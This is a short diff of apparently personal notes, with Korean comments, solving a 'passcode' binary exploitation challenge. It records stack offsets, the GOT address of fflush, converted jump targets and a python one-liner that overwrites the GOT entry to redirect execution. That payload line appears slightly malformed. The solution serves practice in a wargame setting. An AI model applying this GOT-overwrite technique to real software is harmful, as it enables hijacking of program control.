@@ -1,0 +1,20 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+//길이 96인 문자열
+
+
+name = ebp-112
+passcode1 = ebp -16
+passcode2 = ebp -14
+
+fflush의 got 0x 8 04 a0 04 
+0x080485ea (를 10진수로 변환시킨 값)
+134514154
+134514147
+134513760‬
+134514607‬
+python -c 'print("A"*96+"\x04\a0\x04\x08"+"134514147‬‬")' | ./passcode
+
+
+
+
+0x80487af
